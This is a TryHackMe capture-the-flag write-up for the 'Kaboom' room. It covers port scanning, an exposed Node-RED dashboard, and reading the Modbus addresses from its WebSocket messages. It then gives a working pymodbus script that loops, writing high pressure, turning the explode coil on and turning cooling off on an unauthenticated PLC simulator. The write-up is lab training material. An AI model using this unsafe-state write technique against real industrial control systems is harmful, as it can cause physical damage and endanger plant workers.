---
title: "TryHackMe: Kaboom"
author: '0x6D4E6D'
categories: [TryHackMe]
tags: [ot, ics, modbus, nodered]
render_with_liquid: false
media_subpath: /assets/images/tryhackme_kaboom
image:
  path: room-img.png
---
## Overview

This challenge drops you into the shoes of the APT operator: With a single crafted Modbus, you over-pressurise the main pump, triggering a thunderous blow-out that floods the plant with alarms. While chaos reigns, your partner ghosts through the shaken DMZ and installs a stealth implant, turning the diversion’s echo into your persistent beachhead.

Room Link: [Kaboom](https://tryhackme.com/room/kaboom)

## 1. Recon

I started the enumeration with **RustScan** to quickly identify open TCP ports and passed the discovered ports to **Nmap** for service and default script detection:

```bash
rustscan -a 10.114.143.130 -b 500 --ulimit 5000 -- -sV -sC -Pn
```

The target `10.114.143.130` appears to be a Linux-based host exposing several web and industrial control system related services. SSH is available on port `22`, running `OpenSSH 9.6p1` on Ubuntu.

Port `80` hosts a Python `Werkzeug` web application titled `PLC CCTV Simulator`, which indicates that the machine is presenting a PLC/CCTV monitoring interface. Port `8080` also runs a Werkzeug HTTP service and redirects to `/login`, suggesting a separate login-based web application.

Several OT/ICS-related services are exposed. Port `102` is identified as a `Siemens S7 PLC` service, with Nmap reporting a simulated Siemens CPU module and the system name `SNAP7-SERVER`. Port `502` exposes `Modbus TCP`, which is commonly used for PLC communication. Port `44818` appears to be related to `EtherNet/IP`. Port `1880` returns OpenJS/Node-RED related content, suggesting that a `Node-RED` service or dashboard is present.

Based on these results, the most interesting services for further enumeration are:

- Port `80` - PLC CCTV web interface
- Port `1880` - Node-RED dashboard
- Port `502` - Modbus TCP

The combination of a web dashboard and exposed industrial protocols suggests that the challenge involves inspecting how the web interface communicates with the PLC simulator and then manipulating the underlying Modbus values.

![RustScan output showing open ports](rustscan.png)

## 2. Web Enumeration

After identifying the open services, I started by checking the web applications exposed on the target.

The first interesting web service was running on port `80`:

```text
http://10.114.143.130/
```

Opening the page in a browser showed a simple web interface titled `PLC CCTV Simulator`. The page displayed a live-looking camera panel and a process status message related to temperature and cooling.

At this point, the page appeared to be a monitoring interface for a simulated PLC/industrial process.

![PLC CCTV Simulator page](web-port-80.png)

The page did not immediately expose the flag, but it confirmed that the web application was displaying the state of the simulated process.

Next, I checked the service running on port `1880`, which looked like Node-RED from the scan results:

```text
http://10.114.143.130:1880/
```

Opening this page showed the Node-RED login screen. Since I did not have credentials, I could not access the main Node-RED editor.

![Node-RED login page](nodered-login.png)

After confirming that the service was Node-RED, I looked for common Node-RED endpoints and dashboard paths. Node-RED dashboards are commonly exposed under `/ui/`, so I tested the following endpoint:

```text
http://10.114.143.130:1880/ui/
```

This endpoint was accessible and displayed an OT-style dashboard with sensor readings and cooling system information.

![Node-RED dashboard](nodered-ui.png)

This was an important discovery because the dashboard was likely communicating with the PLC simulator in the background. Since the room exposed Modbus TCP on port `502`, I suspected that the dashboard was reading Modbus values and displaying them in the web interface.

At this stage, the main finding was that the Node-RED editor required authentication, but the dashboard at `/ui/` was accessible and showed live process values.

---
## 3. Understanding the Dashboard Communication

After finding the accessible Node-RED dashboard at:

```text
http://10.114.143.130:1880/ui/
```

I wanted to understand how the dashboard was receiving the live sensor values.

In Firefox Developer Tools, I opened:

```text
F12 -> Network -> WS
```

Then I refreshed the dashboard page and selected the WebSocket connection:

```text
/ui/socket.io/?EIO=4&transport=websocket
```

Inside the WebSocket messages, I noticed that the dashboard was receiving live update messages from Node-RED.

One message showed that the dashboard was reading a pressure value:

```text
452-["update-value",{"msg":{"templateScope":"local","topic":"polling","payload":68,"responseBuffer":{"data":[68]},"input":{"topic":"polling","from":"Read Pressure","payload":{"unitid":"1","fc":3,"address":"0","quantity":"1"}},"sendingNodeId":"read_pressure"},"id":"template_pump"}]
```

This was important because it revealed that the value displayed on the dashboard was coming from Modbus:

```text
Unit ID: 1
Function Code: 3 - Read Holding Registers
Address: 0
Quantity: 1
```

The returned value, `68`, matched the pressure/temperature style value shown in the dashboard.

![Node-RED WebSocket pressure message](nodered-websocket-pressure.png)

I also found another WebSocket message showing that Node-RED was reading coils:

```text
452-["update-value",{"msg":{"templateScope":"local","topic":"polling","payload":{"cooling":false,"explode":false},"input":{"topic":"polling","from":"Read Coils","payload":{"unitid":"1","fc":1,"address":"10","quantity":"6"}},"sendingNodeId":"read_coils"},"id":"template_cooling"}]
```

This revealed that the dashboard was also reading Modbus coils:

```text
Unit ID: 1
Function Code: 1 - Read Coils
Starting Address: 10
Quantity: 6
```

The payload contained process-related values:

```json
{
  "cooling": false,
  "explode": false
}
```

At this point, I understood that the web dashboard was not just a static page. It was reading live process values from the PLC simulator through Modbus. The WebSocket traffic gave me the exact Modbus function codes and addresses to investigate next.

![Node-RED WebSocket coils message](nodered-websocket-coils.png)

---

## 4. Modbus Enumeration with Python

Since the scan showed Modbus TCP exposed on port `502`, and the WebSocket traffic revealed Modbus addresses, I moved from the browser to direct Modbus interaction.

I installed `pymodbus`:

```bash
python3 -m pip install pymodbus
```

First, I created a simple script to read the relevant Modbus coils and holding registers.

```python
from pymodbus.client import ModbusTcpClient
import sys

ip = sys.argv[1]

client = ModbusTcpClient(ip, port=502)
client.connect()

coils = client.read_coils(10, count=6, slave=1)
regs = client.read_holding_registers(0, count=5, slave=1)

print("coils 10-15:", coils.bits[:6])
print("registers 0-4:", regs.registers)

client.close()
```

I saved it as:

```text
read_modbus.py
```

Then I ran it against the target:

```bash
python3 read_modbus.py 10.114.143.130
```

Example output:

```text
coils 10-15: [False, False, False, False, False, False]
registers 0-4: [62, 0, 0, 0, 0]
```

This confirmed that Modbus could be read directly without authentication.

It also matched what I saw in the WebSocket traffic:

```text
Holding register 0 = pressure / temperature value
Coils starting at address 10 = process state values
```

![Reading Modbus values](read-modbus.png)

---

## 5. Mapping and Triggering the Process State

After comparing the dashboard values, WebSocket messages, and Modbus reads, I identified the important values:

```text
holding register 0 = pressure / temperature
coil 10 = explode state
coil 11 = cooling state
```

The goal was to force the process into an unsafe state:

```text
High Temperature
Cooling OFF
Explode TRUE
```

In Modbus terms, that meant:

```text
register 0 = 200
coil 10 = True
coil 11 = False
```

To trigger this state, I created the following script:

```python
from pymodbus.client import ModbusTcpClient
import time
import sys

ip = sys.argv[1]

while True:
    client = ModbusTcpClient(ip, port=502)
    client.connect()

    # coils 10-15:
    # coil 10 = explode ON
    # coil 11 = cooling OFF
    client.write_coils(10, [True, False, False, False, False, False], slave=1)

    # high pressure / temperature
    client.write_register(0, 200, slave=1)

    coils = client.read_coils(10, count=6, slave=1)
    regs = client.read_holding_registers(0, count=5, slave=1)

    print("coils 10-15:", coils.bits[:6])
    print("registers 0-4:", regs.registers)
    print("---")

    client.close()
    time.sleep(0.5)
```

I saved it as:

```text
trigger.py
```

Then I ran it:

```bash
python3 trigger.py 10.114.143.130
```

The script continuously forced the required Modbus state:

```text
coils 10-15: [True, False, False, False, False, False]
registers 0-4: [200, 0, 0, 0, 0]
```

![Trigger script output](trigger-script.png)

While the script was running, I refreshed the web page on port `80`:

```text
http://10.114.143.130/
```

The web page detected the unsafe process state and changed to:

```text
Status: Explosion Detected!
```

After this, the flag appeared on the normal web page.

```text
THM{REDACTED}
```

![Flag on web page](flag.png)


